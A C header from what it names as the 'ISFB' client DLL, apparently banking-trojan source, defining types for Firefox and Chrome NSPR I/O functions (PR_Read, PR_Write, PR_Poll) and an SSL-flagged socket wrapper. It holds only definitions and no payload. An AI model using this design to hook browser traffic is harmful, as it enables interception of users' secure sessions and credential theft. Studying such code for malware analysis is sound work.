//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: prio.h
// $Revision: 194 $
// $Date: 2014-02-06 18:17:47 +0300 (Чт, 06 фев 2014) $
// description:
//	ISFB client DLL. PR IO interface definitions, common for FF and CHROME.

typedef struct _PRPollDesc {
	HANDLE fd;
	USHORT in_flags;
	USHORT out_flags;
} PRPollDesc, *PPRPollDesc;

typedef  LONG	(_cdecl* FUNC_PR_Read)		(HANDLE fd, PCHAR buf, LONG amount, PVOID context);
typedef  LONG	(_cdecl* FUNC_PR_Write)		(HANDLE fd, PCHAR buf, LONG amount, PVOID context);
typedef  LONG	(_cdecl* FUNC_PR_Close)		(HANDLE fd, PVOID context);
typedef  LONG	(_cdecl* FUNC_PR_GetError)	(PVOID context);
typedef  VOID	(_cdecl* FUNC_PR_SetError)	(LONG errorCode, LONG oserr, PVOID context);
typedef	 LONG	(_cdecl* FUNC_PR_Poll)		(PRPollDesc *pds, LONG npds, LONG timeout);

 LONG	_cdecl	PR_Close(HANDLE fd);
 LONG	_cdecl	PR_Read(HANDLE fd, PCHAR buf, LONG amount);
 LONG	_cdecl	PR_Write(HANDLE fd, PCHAR buf, LONG amount);
 LONG	_cdecl	PR_GetError(VOID);
 VOID	_cdecl	PR_SetError(LONG errorCode, LONG oserr);
 LONG	_cdecl	PR_Poll(PRPollDesc *pds, LONG npds, LONG timeout);

typedef struct _PR_SOCKET PR_SOCKET, *PPR_SOCKET;

#define PR_POLL_READ   0x01
#define PR_POLL_WRITE  0x02
#define PR_POLL_EXCEPT 0x04
#define PR_POLL_ERR    0x08
#define PR_POLL_NVAL   0x10
#define PR_POLL_HUP    0x20

 LONG	PRIO_Read(PPR_SOCKET Ps, PCHAR buf, LONG amount);
 LONG	PRIO_Write(PPR_SOCKET Ps, PCHAR buf, LONG amount);
 LONG	PRIO_Close(PPR_SOCKET Ps);
 LONG	PRIO_Poll(PRPollDesc *pds, LONG npds);

#define PR_CONNECT_RESET_ERROR	-5961
#define PR_WOULD_BLOCK_ERROR	-5998
#define MAX_LOAD_ATTEMPTS		3

 // Chrome-specific definitions

 typedef struct _PRIO_METHODS {
	ULONG_PTR		file_type;           /* Type of file represented (tos)           */
    FUNC_PR_Close	close;                /* close file and destroy descriptor        */
    FUNC_PR_Read	read;                  /* read up to specified bytes into buffer   */
    FUNC_PR_Write	write;                /* write specified bytes from buffer        */

    PVOID available;        /* determine number of bytes available      */
    PVOID available64;    /*          ditto, 64 bit                   */
    PVOID fsync;                /* flush all buffers to permanent store     */
    PVOID seek;                  /* position the file to the desired place   */
    PVOID seek64;              /*           ditto, 64 bit                  */
    PVOID fileInfo;          /* Get information about an open file       */
    PVOID fileInfo64;      /*           ditto, 64 bit                  */

    PVOID writev;              /* Write segments as described by iovector  */
    PVOID connect;            /* Connect to the specified (net) address   */
    PVOID accept;              /* Accept a connection for a (net) peer     */
    PVOID bind;                  /* Associate a (net) address with the fd    */
    PVOID listen;              /* Prepare to listen for (net) connections  */
    PVOID shutdown;          /* Shutdown a (net) connection              */
    PVOID recv;                  /* Solicit up the the specified bytes       */
    PVOID send;                  /* Send all the bytes specified             */
    PVOID recvfrom;          /* Solicit (net) bytes and report source    */
    PVOID sendto;              /* Send bytes to (net) address specified    */
    FUNC_PR_Poll	 poll;     /* Test the fd to see if it is ready        */
    PVOID acceptread;      /* Accept and read on a new (net) fd        */
    PVOID transmitfile;  /* Transmit at entire file                  */
    PVOID getsockname;    /* Get (net) address associated with fd     */
    PVOID getpeername;    /* Get peer's (net) address                 */
    PVOID reserved_fn_6;     /* reserved for future use */
    PVOID reserved_fn_5;     /* reserved for future use */
    PVOID getsocketoption;	/* Get current setting of specified option  */
    PVOID setsocketoption;	 /* Set value of specified option            */
	PVOID sendfile;                      /* Send a (partial) file with header/trailer*/
    PVOID connectcontinue;	 /* Continue a nonblocking connect */
	PVOID reserved_fn_3;         /* reserved for future use */
    PVOID reserved_fn_2;         /* reserved for future use */
    PVOID reserved_fn_1;         /* reserved for future use */
    PVOID reserved_fn_0;         /* reserved for future use */
} PRIO_METHODS, *PPRIO_METHODS;

typedef struct _PRFileDesc PRFileDesc, *PPRFileDesc;

typedef struct _PRFileDesc {
	PPRIO_METHODS	methods;
	PVOID			secret;
	PPRFileDesc		lower;
	PPRFileDesc		higher;
	PVOID			dtor;
	ULONG			identity;
} PRFileDesc, *PPRFileDesc;

 
typedef	struct _IOBUFFER
{
	PVOID		Methods;
	ULONG_PTR	Unknown;
	PCHAR		Buffer;
} IOBUFFER, PIOBUFFER;

typedef struct _PRAPI
{
	FUNC_PR_Close		Close;
	FUNC_PR_Read		Read;
	FUNC_PR_Write		Write;
	FUNC_PR_Poll		Poll;
	FUNC_PR_GetError	GetError;
	FUNC_PR_SetError	SetError;
} PRAPI, *PPRAPI;

typedef struct _PR_SOCKET
{
	HANDLE	fd;
	PPRAPI	Api;
	PVOID	Context;
	ULONG	Flags;
} _PR_SOCKET, *PPR_SOCKET;

#define		PR_SOCKET_FLAG_SSL		1
#define		PRIO_FILE_TYPE_SSL		4
